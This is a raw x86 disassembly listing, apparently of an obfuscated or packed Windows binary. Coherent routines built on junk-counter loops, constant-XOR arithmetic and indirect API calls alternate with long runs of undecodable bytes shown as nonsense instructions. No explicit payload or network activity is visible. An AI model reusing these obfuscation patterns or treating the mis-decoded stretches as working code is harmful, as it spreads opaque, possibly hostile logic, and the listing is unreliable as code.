  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	sbb    bl,BYTE PTR [edi+ebx*1+0x7ecc2b0d]
  407c51:	jle    0x407c58
  407c53:	jl     0x407cd3
  407c55:	jle    0x407c3a
  407c57:	pop    eax
  407c58:	inc    eax
  407c59:	andnps xmm3,XMMWORD PTR [ecx]
  407c5c:	mov    ch,0xfe
  407c5e:	inc    eax
  407c5f:	imul   ecx,ebp,0xbb803217
  407c65:	std    
  407c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c67:	sub    eax,0x17b40528
  407c6c:	ret    
  407c6d:	test   BYTE PTR [ecx+0x3b],bh
  407c70:	jmp    0x207c:0xf6877e85
  407c77:	push   ecx
  407c78:	mov    eax,0xaf534cd7
  407c7d:	xor    eax,0x97f1707a
  407c82:	sub    dl,BYTE PTR [edx-0x17b1bcb8]
  407c88:	adc    DWORD PTR [esi],ecx
  407c8a:	enterw 0xfa72,0x75
  407c8f:	cmp    al,dh
  407c91:	lds    eax,FWORD PTR [ebx]
  407c93:	cld    
  407c94:	(bad)  
  407c95:	aaa    
  407c96:	retf   
  407c97:	add    DWORD PTR [eax+0x1a],ebp
  407c9a:	push   edx
  407c9b:	mov    ds:0x2593e568,al
  407ca0:	or     esp,DWORD PTR [edi]
  407ca2:	pop    esi
  407ca3:	xchg   ebp,eax
  407ca4:	cld    
  407ca5:	stos   DWORD PTR es:[edi],eax
  407ca6:	push   ss
  407ca7:	stos   DWORD PTR es:[edi],eax
  407ca8:	jne    0x407c38
  407caa:	pop    eax
  407cab:	test   eax,0xc6d8ee1b
  407cb0:	xchg   edx,eax
  407cb1:	pop    esi
  407cb2:	jae    0x407c6e
  407cb4:	add    eax,0xcabe674e
  407cb9:	mov    edi,0xef04a720
  407cbe:	adc    al,0x15
  407cc0:	sbb    ch,dl
  407cc2:	stos   BYTE PTR es:[edi],al
  407cc3:	push   edx
  407cc4:	xor    BYTE PTR [eax],ah
  407cc6:	dec    ebx
  407cc7:	and    BYTE PTR cs:0x3438ab12,dh
  407cce:	jbe    0x407d4b
  407cd0:	push   cs
  407cd1:	daa    
  407cd2:	aas    
  407cd3:	adc    DWORD PTR [eax],ebp
  407cd5:	dec    esi
  407cd6:	xor    eax,0x45dd0b46
  407cdb:	sub    eax,0xde7bd3b3
  407ce0:	loope  0x407cd4
  407ce2:	jge    0x407d56
  407ce4:	in     eax,dx
  407ce5:	daa    
  407ce6:	or     cl,BYTE PTR [ebx+0x32261f74]
  407cec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ced:	pop    es
  407cee:	aas    
  407cef:	and    eax,0x6337adbb
  407cf4:	lods   eax,DWORD PTR ds:[esi]
  407cf5:	aas    
  407cf6:	rol    BYTE PTR [ebx-0x58],1
  407cf9:	loope  0x407cf2
  407cfb:	scas   al,BYTE PTR es:[edi]
  407cfc:	sbb    eax,DWORD PTR [eax+esi*8-0x4bd3acb3]
  407d03:	pop    edi
  407d04:	mov    esp,0x3f6440d4
  407d09:	dec    esi
  407d0a:	pop    ds
  407d0b:	fsubr  QWORD PTR [ebx]
  407d0d:	aaa    
  407d0e:	cmp    edi,DWORD PTR [ecx]
  407d10:	inc    ebx
  407d11:	(bad)  
  407d12:	dec    ebp
  407d13:	jae    0x407d90
  407d15:	jne    0x407d75
  407d17:	dec    edx
  407d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d19:	jbe    0x407d64
  407d1b:	call   0x9e0fcf9b
  407d20:	retf   
  407d21:	outs   dx,DWORD PTR ds:[esi]
  407d22:	jns    0x407d5f
  407d24:	call   0x2c2c6cf3
  407d29:	add    bh,bh
  407d2b:	push   esp
  407d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d2d:	out    dx,al
  407d2e:	and    eax,DWORD PTR [ecx+ecx*8+0x61a7847e]
  407d35:	add    al,0x18
  407d37:	loop   0x407d42
  407d39:	xor    BYTE PTR [ebx],al
  407d3b:	xchg   ebp,eax
  407d3c:	mov    ebx,0x36e2dc2b
  407d41:	in     al,0x75
  407d43:	stos   DWORD PTR es:[edi],eax
  407d44:	fimul  DWORD PTR [esi]
  407d46:	pop    ecx
  407d47:	xor    DWORD PTR [ebx],0x5f5ca0af
  407d4d:	jecxz  0x407cd4
  407d4f:	icebp  
  407d50:	shl    ecx,0xd6
  407d53:	inc    eax
  407d54:	push   esp
  407d55:	jb     0x407d20
  407d57:	pop    ecx
  407d58:	xlat   BYTE PTR ds:[ebx]
  407d59:	inc    edx
  407d5a:	addr16 mov dl,0x15
  407d5d:	sbb    DWORD PTR [ebx],ebp
  407d5f:	pop    esp
  407d60:	gs ja  0x407d1c
  407d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d64:	fimul  WORD PTR [ebp-0x75]
  407d67:	or     al,0xb3
  407d69:	jg     0x407da8
  407d6b:	addr16 sbb ecx,esi
  407d6e:	mov    esp,0x3f65cea3
  407d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d74:	jne    0x407d8f
  407d76:	iret   
  407d77:	add    al,0x40
  407d79:	(bad)  
  407d7a:	push   ebp
  407d7b:	push   eax
  407d7c:	stc    
  407d7d:	pop    esi
  407d7e:	and    dh,BYTE PTR [esi+0x6f0343cd]
  407d84:	pop    ecx
  407d85:	lahf   
  407d86:	add    al,bh
  407d88:	idiv   BYTE PTR [edi+0x63]
  407d8b:	sub    cl,BYTE PTR [ebx+0x3c6c1df4]
  407d91:	shr    BYTE PTR [edi-0x5a34699],1
  407d97:	adc    eax,0xb4c1f3cc
  407d9c:	pop    eax
  407d9d:	adc    al,bh
  407d9f:	and    DWORD PTR [ebx],esi
  407da1:	pop    edx
  407da2:	sbb    BYTE PTR [edx],0xf0
  407da5:	outs   dx,DWORD PTR ds:[esi]
  407da6:	fidiv  WORD PTR [edi]
  407da8:	test   al,0xb4
  407daa:	push   ecx
  407dab:	aam    0xf0
  407dad:	aam    0x38
  407daf:	pop    esi
  407db0:	(bad)  
  407db1:	outs   dx,BYTE PTR ds:[esi]
  407db2:	loope  0x407da9
  407db4:	mov    dl,0x9f
  407db6:	stos   DWORD PTR es:[edi],eax
  407db7:	xchg   ebx,eax
  407db8:	pop    edi
  407db9:	fisttp WORD PTR [eax+0x7de9f119]
  407dbf:	cmp    BYTE PTR [eax],bl
  407dc1:	iret   
  407dc2:	adc    ebx,DWORD PTR [edi+0x27a7c03a]
  407dc8:	cmp    DWORD PTR [ebx-0x47],eax
  407dcb:	aas    
  407dcc:	mul    ch
  407dce:	fdivp  st(7),st
  407dd0:	mov    bh,0xb5
  407dd2:	sbb    BYTE PTR ds:0xa62092d4,dl
  407dd8:	cli    
  407dd9:	push   0x784f813e
  407dde:	pop    ebp
  407ddf:	dec    esp
  407de0:	dec    esp
  407de1:	and    al,0x97
  407de3:	or     DWORD PTR [edi-0x46],0x479da219
  407dea:	dec    ebp
  407deb:	xor    edi,DWORD PTR [ebx]
  407ded:	(bad)  
  407dee:	mov    ecx,0xc0ad18a0
  407df3:	adc    BYTE PTR [esi],ch
  407df5:	jns    0x407dad
  407df7:	mov    edx,DWORD PTR [edi-0x5ce20fe9]
  407dfd:	aam    0x8e
  407dff:	hlt    
  407e00:	addr16 add esp,edx
  407e03:	mov    eax,0xe9192bc9
  407e08:	aaa    
  407e09:	mov    ecx,0xf0df9ff0
  407e0e:	xor    al,0xcb
  407e10:	sub    DWORD PTR [ecx],ecx
  407e12:	and    dh,bl
  407e14:	pop    edx
  407e15:	xchg   ecx,eax
  407e16:	sub    ah,BYTE PTR [eax-0x30]
  407e19:	idiv   DWORD PTR [esi+0x380c1a4f]
  407e1f:	fs (bad) 
  407e21:	inc    ebp
  407e22:	outs   dx,BYTE PTR ds:[esi]
  407e23:	lahf   
  407e24:	xchg   ebx,eax
  407e25:	(bad)  
  407e26:	stc    
  407e27:	mov    bh,0x33
  407e29:	fstp   DWORD PTR [edi]
  407e2b:	mov    eax,DWORD PTR [edi-0x6a]
  407e2e:	sub    al,0x5e
  407e30:	dec    edi
  407e31:	xchg   esp,eax
  407e32:	shr    DWORD PTR [esi],0xff
  407e35:	sbb    al,BYTE PTR [edx]
  407e37:	or     edx,DWORD PTR [ebx-0xff32a57]
  407e3d:	ror    dl,1
  407e3f:	popf   
  407e40:	sbb    al,0x92
  407e42:	cmp    eax,0x79be020f
  407e47:	scas   eax,DWORD PTR es:[edi]
  407e48:	outs   dx,DWORD PTR ds:[esi]
  407e49:	sbb    ebp,ecx
  407e4b:	push   es
  407e4c:	(bad)  
  407e4d:	int3   
  407e4e:	xor    BYTE PTR [eax],0xe1
  407e51:	dec    edi
  407e52:	inc    esp
  407e53:	xor    al,0x7f
  407e55:	pop    edx
  407e56:	stc    
  407e57:	je     0x407eb3
  407e59:	xor    ebp,edi
  407e5b:	gs sub al,0xdf
  407e5e:	cwde   
  407e5f:	xchg   ecx,eax
  407e60:	adc    cl,BYTE PTR [ecx-0xbba74f0]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4336eb
  407f81:	or     DWORD PTR ds:0x4336ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433757,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433753,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43379b
  407fad:	sub    DWORD PTR ds:0x433727,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4336db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43372b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43372b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43372b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43372b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43372b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433967
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43372b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43372b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43372b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43372b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43372b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43372b,ebx
  408048:	cmp    DWORD PTR ds:0x43372b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43372b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43372b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43372b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43372b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43367b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43375b
  4080b1:	and    DWORD PTR ds:0x433763,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43371b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4337a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4337a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4337a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4337a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43375b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4337a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4337a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4337a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4337a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433797,0x1f
  40813b:	cmp    DWORD PTR ds:0x433797,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433797,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433797
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433797,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x243ba80d
  408191:	ret    0xca3e
  408194:	jle    0x408214
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	and    ah,BYTE PTR [eax-0x3a]
  40819d:	mov    dh,0xb8
  40819f:	add    al,cl
  4081a1:	into   
  4081a2:	ins    DWORD PTR es:[edi],dx
  4081a3:	stc    
  4081a4:	les    esi,FWORD PTR ds:0xb31d9acc
  4081aa:	ds cwde 
  4081ac:	jg     0x408156
  4081ae:	call   0xebe4:0x66f26285
  4081b5:	jg     0x408180
  4081b7:	jo     0x4081c9
  4081b9:	jnp    0x4081b7
  4081bb:	mov    edx,0x55d0d7a7
  4081c0:	inc    ebx
  4081c1:	mov    esp,0x19ab7ea3
  4081c6:	cli    
  4081c7:	or     eax,0xd3e8f6cf
  4081cc:	int3   
  4081cd:	cmp    ebx,DWORD PTR [eax]
  4081cf:	(bad)  
  4081d0:	or     edi,ecx
  4081d2:	or     al,0x26
  4081d4:	sub    al,0x1c
  4081d6:	xchg   esi,eax
  4081d7:	sbb    DWORD PTR [ebp+0x7f5fe7c8],ecx
  4081dd:	sub    edi,DWORD PTR [edx-0x30a50347]
  4081e3:	out    0xa0,eax
  4081e5:	ds and esp,DWORD PTR cs:[esi+ebp*8+0x41]
  4081eb:	ficom  WORD PTR [esi]
  4081ed:	sbb    BYTE PTR [ecx+0x32],al
  4081f0:	cs hlt 
  4081f2:	sbb    DWORD PTR [esp+eax*1-0x6229b2e2],edi
  4081f9:	jl     0x40820e
  4081fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081fc:	outs   dx,BYTE PTR ds:[esi]
  4081fd:	or     esi,esi
  4081ff:	call   0x64dbbc7d
  408204:	jmp    0xdd35840
  408209:	in     al,0x52
  40820b:	jle    0x4081a7
  40820d:	scas   al,BYTE PTR es:[edi]
  40820e:	jmp    0x4081bc
  408210:	push   ss
  408211:	fcmove st,st(4)
  408213:	dec    esp
  408214:	mov    cs,WORD PTR [esi+0x1cb11f5b]
  40821a:	cmp    esp,DWORD PTR [eax-0x7c]
  40821d:	or     al,0x77
  40821f:	fiadd  DWORD PTR ss:[eax]
  408222:	js     0x40822e
  408224:	push   cs
  408225:	jns    0x40827c
  408227:	iret   
  408228:	ss test eax,0x637dc61d
  40822e:	fcomi  st,st(3)
  408230:	jge    0x4081e5
  408232:	repnz dec eax
  408234:	rcl    DWORD PTR [ecx],1
  408236:	in     eax,dx
  408237:	in     al,dx
  408238:	stos   DWORD PTR es:[edi],eax
  408239:	inc    ebp
  40823a:	jne    0x4081bc
  40823c:	dec    ch
  40823e:	mov    eax,0x90f0c2ff
  408243:	jle    0x4082b8
  408245:	xchg   DWORD PTR [ebp+0x12],ecx
  408248:	cdq    
  408249:	daa    
  40824a:	jbe    0x408216
  40824c:	jp     0x4081d1
  40824e:	sub    BYTE PTR [ebp-0x161fa60a],bl
  408254:	jns    0x4082ce
  408256:	leave  
  408257:	xchg   edi,eax
  408258:	shr    DWORD PTR [eax+edx*4-0x4a],cl
  40825c:	add    DWORD PTR [edx+0x74],edx
  40825f:	jp     0x4082b6
  408261:	div    esp
  408263:	mov    bl,0xd6
  408265:	ret    
  408266:	inc    ecx
  408267:	repnz mov ds:0x2b9cf4a8,eax
  40826d:	mov    esi,DWORD PTR [edi]
  40826f:	mov    WORD PTR [ebx+edx*8-0x2f],fs
  408273:	(bad)  
  408274:	int    0x6f
  408276:	mov    BYTE PTR [ebp+0x41b1101f],dh
  40827c:	out    dx,al
  40827d:	fstp   TBYTE PTR [ebp+0x78]
  408280:	dec    ebp
  408281:	pop    esi
  408282:	push   ss
  408283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408284:	xor    esi,eax
  408286:	fneni(8087 only) 
  408288:	and    ebx,ebp
  40828a:	add    eax,0xbf53a1de
  40828f:	cs inc ebp
  408291:	xor    cl,dh
  408293:	loopne 0x4082d6
  408295:	(bad)
  40829a:	pop    ds
  40829b:	jmp    0xf0ab:0xd6ec90a0
  4082a2:	jl     0x408237
  4082a4:	mov    ecx,0xd1fa68d9
  4082a9:	inc    ebp
  4082aa:	jecxz  0x408231
  4082ac:	push   0xb5d87b2f
  4082b1:	fnstsw WORD PTR [ecx+0x78a40db0]
  4082b7:	sbb    BYTE PTR [edi],bl
  4082b9:	jmp    0x40829c
  4082bb:	xchg   ebp,eax
  4082bc:	push   esi
  4082bd:	test   DWORD PTR [edx-0x403bf6bd],esp
  4082c3:	stos   DWORD PTR es:[edi],eax
  4082c4:	cdq    
  4082c5:	xor    al,0xf4
  4082c7:	f2xm1  
  4082c9:	popf   
  4082ca:	lock (bad) 
  4082cc:	sbb    ah,ah
  4082ce:	(bad)  
  4082cf:	cmp    DWORD PTR [esi+ecx*1+0x58],esp
  4082d3:	xor    DWORD PTR [eax-0x55],edi
  4082d6:	out    0xeb,al
  4082d8:	and    edi,DWORD PTR ds:[ebp+0x61b14675]
  4082df:	out    0xaa,eax
  4082e1:	mov    eax,ds:0x31b828d6
  4082e6:	cli    
  4082e7:	or     eax,0xe0d23465
  4082ec:	stos   BYTE PTR es:[edi],al
  4082ed:	dec    esi
  4082ee:	aas    
  4082ef:	mov    eax,0xe417c2f2
  4082f4:	sbb    al,0x4f
  4082f6:	mov    dl,0xfc
  4082f8:	fdiv   QWORD PTR [esi+eax*1-0x3e]
  4082fc:	mov    esi,0x4523feb
  408301:	stc    
  408302:	mov    ch,0x89
  408304:	aam    0x9f
  408306:	add    ebx,0xffffffd2
  408309:	das    
  40830a:	xchg   ebp,eax
  40830b:	jb     0x4082d4
  40830d:	dec    ecx
  40830e:	shl    BYTE PTR [edi-0x2cd40731],cl
  408314:	inc    edx
  408315:	cmc    
  408316:	adc    eax,0xa71dba15
  40831b:	ins    BYTE PTR es:[edi],dx
  40831c:	fidivr WORD PTR [edx+0x34]
  40831f:	mov    dl,0xa0
  408321:	jbe    0x40835c
  408323:	int    0x8f
  408325:	(bad)  
  408326:	aaa    
  408327:	pop    es
  408328:	and    cl,BYTE PTR [edi+0x4c8dfe36]
  40832e:	and    edi,esi
  408330:	jns    0x4082f8
  408332:	call   0xc455:0x65c16dc
  408339:	xchg   esp,eax
  40833a:	daa    
  40833b:	jmp    DWORD PTR [ebx+ecx*8+0x7d]
  40833f:	ja     0x408385
  408341:	lahf   
  408342:	dec    esp
  408343:	inc    edi
  408344:	dec    edi
  408345:	fld    st(6)
  408347:	pop    esi
  408348:	(bad)  [esi-0x71a32f06]
  40834e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40834f:	fld    TBYTE PTR ds:0xe53cefd6
  408355:	mov    bl,0x97
  408357:	inc    edi
  408358:	jns    0x4083a9
  40835a:	call   0x78ab204f
  40835f:	outs   dx,BYTE PTR ds:[esi]
  408360:	and    esi,DWORD PTR [ebp-0x69]
  408363:	pop    ebx
  408364:	sub    eax,0xc2b8a38c
  408369:	xor    BYTE PTR [ecx+0x6c],bl
  40836c:	xor    al,0xf2
  40836e:	mov    ah,0x4a
  408370:	jns    0x408325
  408372:	mov    esi,0x5e411e0
  408377:	fisubr WORD PTR [edi]
  408379:	jg     0x4083f9
  40837b:	push   ecx
  40837c:	shl    eax,cl
  40837e:	clc    
  40837f:	ja     0x408307
  408381:	jo     0x4083d0
  408383:	sbb    al,0xf
  408385:	std    
  408386:	jno    0x4083ac
  408388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408389:	pop    esi
  40838a:	dec    ecx
  40838b:	test   BYTE PTR [edx-0x7e],dh
  40838e:	dec    ebp
  40838f:	or     BYTE PTR [ecx-0x7c],cl
  408392:	fwait
  408393:	push   edi
  408394:	imul   esi,DWORD PTR [edx+0x319f812f],0xffffffaa
  40839b:	loope  0x4083b6
  40839d:	mov    edi,0x15d58fd5
  4083a2:	repz mov esp,0x2fab1e4e
  4083a8:	fld    DWORD PTR [esi]
  4083aa:	sar    BYTE PTR [ebx-0x52b68600],1
  4083b0:	sub    eax,0xd84626c9
  4083b5:	mov    ebp,0xd0ab16f7
  4083ba:	jg     0x40838c
  4083bc:	call   0x7f23:0xd2ae07c4
  4083c3:	add    BYTE PTR [ecx+0x2581e045],cl
  4083c9:	(bad)  [esi]
  4083cb:	inc    ebx
  4083cc:	add    BYTE PTR [eax],al
  4083ce:	add    BYTE PTR [eax],al
  4083d0:	add    BYTE PTR [ecx+0x4336db],ah
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4336db,eax
  4083dc:	cmp    DWORD PTR ds:0x4336db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4336db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4336db
  40840c:	inc    eax
  40840d:	mov    ds:0x4336db,eax
  408412:	cmp    DWORD PTR ds:0x4336db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43368b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433693,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4337a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	(bad)  
  408465:	cmp    BYTE PTR [eax+0x7ec8e4ec],bh
  40846b:	jle    0x408491
  40846d:	jl     0x4084ed
  40846f:	jle    0x408433
  408471:	(bad)
  408475:	xor    dh,ah
  408477:	gs ret 
  408479:	ret    0xa62f
  40847c:	add    al,0xbf
  40847e:	in     al,dx
  40847f:	sub    al,0xb4
  408481:	fdiv   DWORD PTR [ecx-0x5b2430b2]
  408487:	pop    eax
  408488:	sub    ah,BYTE PTR [esi]
  40848a:	ss dec esp
  40848c:	js     0x4084f1
  40848e:	jl     0x408450
  408490:	dec    edx
  408491:	(bad)  
  408492:	and    BYTE PTR [esi+0x6e],cl
  408495:	inc    ecx
  408496:	scas   eax,DWORD PTR es:[edi]
  408497:	mov    WORD PTR [ecx-0x1dd6fc3a],es
  40849d:	cmp    DWORD PTR [edx],ebp
  40849f:	push   esp
  4084a0:	dec    edi
  4084a1:	loopne 0x408463
  4084a3:	and    esi,0x5c
  4084a6:	call   0xf3582489
  4084ab:	inc    ebp
  4084ac:	mov    ch,0xee
  4084ae:	fild   QWORD PTR [edx]
  4084b0:	push   eax
  4084b1:	sbb    al,0x7f
  4084b3:	jl     0x40844d
  4084b5:	in     al,dx
  4084b6:	stos   BYTE PTR es:[edi],al
  4084b7:	jg     0x408525
  4084b9:	jle    0x40849e
  4084bb:	pop    ds
  4084bc:	mov    ds:0xe5323d34,al
  4084c1:	push   cs
  4084c2:	jmp    0x7b15fb1f
  4084c7:	pop    esi
  4084c8:	call   0x73c6:0x4b4019e9
  4084cf:	ins    DWORD PTR es:[edi],dx
  4084d0:	adc    DWORD PTR ds:0xff8705e8,ecx
  4084d6:	test   DWORD PTR [ecx+0x799fb18e],ebx
  4084dc:	cwde   
  4084dd:	cmp    edi,esi
  4084df:	add    bh,cl
  4084e1:	in     al,dx
  4084e2:	out    0x29,al
  4084e4:	mov    BYTE PTR [edx],0x68
  4084e7:	out    dx,al
  4084e8:	popf   
  4084e9:	jns    0x4084d9
  4084eb:	xchg   DWORD PTR [edx+0xaaa5747],esp
  4084f1:	fnstenv [ecx-0xc6a2df1]
  4084f7:	je     0x40854d
  4084f9:	push   ds
  4084fa:	sti    
  4084fb:	fidiv  WORD PTR [ecx-0x32]
  4084fe:	stos   DWORD PTR es:[edi],eax
  4084ff:	retf   
  408500:	and    DWORD PTR [esi],0x110a6ceb
  408506:	in     al,0x55
  408508:	bound  ebp,QWORD PTR [eax-0x782b0c9a]
  40850e:	cdq    
  40850f:	mov    eax,0x127608d3
  408514:	mov    ecx,0xd75b0992
  408519:	aas    
  40851a:	mov    edx,0xd8ec3b72
